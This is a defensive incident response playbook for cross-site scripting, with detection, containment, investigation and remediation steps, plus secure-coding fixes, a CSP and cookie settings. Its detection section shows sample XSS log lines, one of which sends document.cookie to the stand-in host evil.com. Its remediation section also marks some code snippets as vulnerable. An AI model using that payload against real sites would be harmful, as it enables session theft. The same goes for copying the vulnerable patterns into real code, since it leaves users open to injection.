# 🚨 Incident Response Playbook — Cross-Site Scripting (XSS)

> **Severity:** High (Stored XSS) / Medium (Reflected XSS) / Medium (DOM XSS)
> **CWE:** CWE-79
> **OWASP:** A03:2021 – Injection
> **Playbook Version:** 1.0

---

## Overview

XSS allows attackers to inject malicious scripts into web pages viewed by other users, enabling session hijacking, credential theft, defacement, and malware distribution.

**XSS Types:**
| Type | Trigger | Persistence | Severity |
|---|---|---|---|
| Stored (Persistent) | Another user views infected page | Stored in DB | High–Critical |
| Reflected | Victim clicks malicious link | Not stored | Medium |
| DOM-based | Client-side JS processes attacker input | Not stored | Medium |

---

## Detection Signals

### WAF / Application Logs
```
GET /search?q=<script>alert(1)</script>
POST /comment: body=<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>
GET /profile?name="><svg/onload=alert(1)>
```

### User Reports
- User reports unexpected popups or alerts
- Session suddenly logged out / credentials changed
- Browser redirected to unexpected site

### SIEM Alerts
- WAF XSS signatures triggered
- Outbound requests from users to unknown C2 domains
- Bulk cookie theft pattern (multiple users, same destination)

---

## Phase 1 — Identification & Triage

**⏱ Target Time: 0–30 minutes**

- [ ] Identify XSS type: Stored / Reflected / DOM
- [ ] Identify the injection point (field, parameter, header)
- [ ] Determine if payload is benign (PoC) or malicious (credential stealer, session hijacker)
- [ ] For Stored XSS: identify how many users have viewed the infected content
- [ ] Check server logs for exfiltration callbacks (requests to attacker-controlled domains)
- [ ] Review if admin accounts were targeted (admin XSS is critical)
- [ ] Identify if payload escalated to more severe attack (XSS → CSRF, XSS → account takeover)

**Severity Escalation:**
- Admin panel XSS → **Critical**
- Stored XSS with credential theft payload → **Critical**
- Stored XSS (general users) → **High**
- Reflected XSS → **Medium**

---

## Phase 2 — Containment

**⏱ Target Time: 30–60 minutes**

### Stored XSS
- [ ] **Remove/nullify** the malicious stored payload from database immediately
- [ ] **Identify all content** from same attacker and remove
- [ ] **Invalidate sessions** for users who viewed the infected content
- [ ] **Force re-login** for potentially affected users
- [ ] Block attacker account / IP

### Reflected / DOM XSS
- [ ] **Block malicious URL pattern** at WAF
- [ ] **Tighten CSP** to block inline scripts immediately
- [ ] Notify users if phishing campaign using reflected XSS link detected

### Immediate CSP Tightening
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
```

---

## Phase 3 — Investigation

**⏱ Target Time: 1–4 hours**

- [ ] Search logs for all instances of the payload (past 30–90 days)
- [ ] Identify all unique payloads used by attacker
- [ ] Check outbound traffic logs for data exfiltration callbacks
- [ ] Enumerate users who loaded infected content
- [ ] Review if attacker used XSS to:
  - [ ] Steal session cookies
  - [ ] Perform CSRF actions on behalf of victim
  - [ ] Capture credentials from login forms (keylogger payload)
  - [ ] Redirect users (phishing)
  - [ ] Deliver malware
- [ ] Check for account takeovers (password/email changes after XSS)
- [ ] Identify if `HttpOnly` was bypassed (suggests non-cookie data theft)

---

## Phase 4 — Eradication & Remediation

### Code Fix

**Output Encoding (Primary Defense):**
```javascript
// VULNERABLE
element.innerHTML = userInput;
document.write(userInput);

// SECURE — Use textContent or DOMPurify
element.textContent = userInput;

// For HTML rendering: sanitize with DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Server-Side Output Encoding (Python/Jinja2):**
```python
# VULNERABLE
return f"<p>Hello {username}</p>"

# SECURE — Jinja2 auto-escapes by default
return render_template('profile.html', username=username)
# In template: {{ username }}  ← auto-escaped
# Use {{ username | safe }} ONLY when content is trusted
```

**Java (OWASP Java Encoder):**
```java
// SECURE
String safe = Encode.forHtml(userInput);
String safeJS = Encode.forJavaScript(userInput);
```

### Content Security Policy (Full)
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

### Cookie Security
```
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/
```

- [ ] `HttpOnly` flag prevents JavaScript access to session cookies
- [ ] `SameSite=Strict` mitigates CSRF chained with XSS
- [ ] Audit all cookie declarations for missing security flags

---

## Phase 5 — Recovery

- [ ] Deploy patched code to staging
- [ ] Verify fix with automated XSS test suite
- [ ] Test CSP in report-only mode before enforcing
- [ ] Deploy to production
- [ ] Monitor CSP violation reports (`report-uri` / `report-to`)
- [ ] Monitor for repeat XSS attempts

---

## Phase 6 — Post-Incident Actions

- [ ] Force password reset for users with confirmed session compromise
- [ ] Notify affected users if credential theft payload was used
- [ ] RCA documented
- [ ] Developer training on output encoding and CSP
- [ ] SAST rules added for `innerHTML`, `document.write`, unsafe template rendering
- [ ] CSP monitoring dashboard established

---

*Playbook Version: 1.0 | Reference: OWASP XSS Prevention Cheat Sheet*
